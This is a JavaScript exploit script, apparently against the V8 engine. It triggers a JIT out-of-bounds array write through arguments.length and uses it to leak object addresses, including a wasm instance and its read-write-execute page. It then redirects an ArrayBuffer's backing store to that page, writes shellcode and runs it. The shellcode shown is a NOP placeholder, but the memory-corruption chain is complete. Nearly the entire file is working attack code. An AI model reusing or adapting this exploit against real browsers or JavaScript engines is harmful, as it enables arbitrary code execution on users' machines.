var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;

var buf =  new ArrayBuffer(8);
var ut = new Uint32Array(buf);
let fl = new Float64Array(buf);

function i2f(num){
    ut[0] = num & 0xffffffff;
    ut[1] = num / 0x100000000;
    return fl[0];
}

function f2i(num){
    fl[0] = num;
    return ut[1] * 0x100000000 + ut[0];
}

function hex(i){
  return i.toString(16).padStart(16, "0");
}

function gc(){
  for(let i=0; i<0x10000; i++){
    new String;
  }
}

gc();gc();


var data_buf = new ArrayBuffer(0x1000);
var data_view = new DataView(data_buf);

function foo(args)
{
    let idx = arguments.length;
    idx >>= 16;
    idx *= 7;
    let oobArray = [1.0,1.1,1.2,1.3];
    oobArray[idx] = 1.74512933848984e-310; // i2f(0x202000000000);
    return oobArray;
}

let f_arr = [1.0];
let arr = [1.0,1.1];
arr.length = 1<<16;
arr.fill(1.2);

for(let i=0; i<0x10000; i++){
    foo(f_arr);
}

let oob_arr = [];

oob_arr = foo(...arr);

let trigger_obj = [{}, {}, {}];
let float_arr = [1.1, 1.2, 1.3];

// leak instance 
trigger_obj[0] = wasmInstance;
// oob_arr[21] == trigger_obj[0];
var instance_addr = f2i(oob_arr[21]);
console.log("[+] leak wasm instance: ", hex(instance_addr));

// leak data_buf
trigger_obj[0] = data_buf;
var data_buf_addr = f2i(oob_arr[21]);
console.log("[+] leak databuf: ", hex(data_buf_addr));

// oob_arr[58] == float_arr->elements;
// leak rwx address
oob_arr[58] = i2f(instance_addr+0x1c0-0x10);
var rwx = f2i(float_arr[0])+0x60-1;
console.log("[+] leak rwx: ", hex(rwx));

// change backing_store
oob_arr[58] = i2f(data_buf_addr+0x20-0x10);
float_arr[0] = i2f(rwx);

// trigger shellcode 
let shellcode = [
    0x90909090,
    0x0,
];

for (var i = 0; i < shellcode.length; i++){
    data_view.setUint32(4*i, shellcode[i], true);
}

wasmFunc();


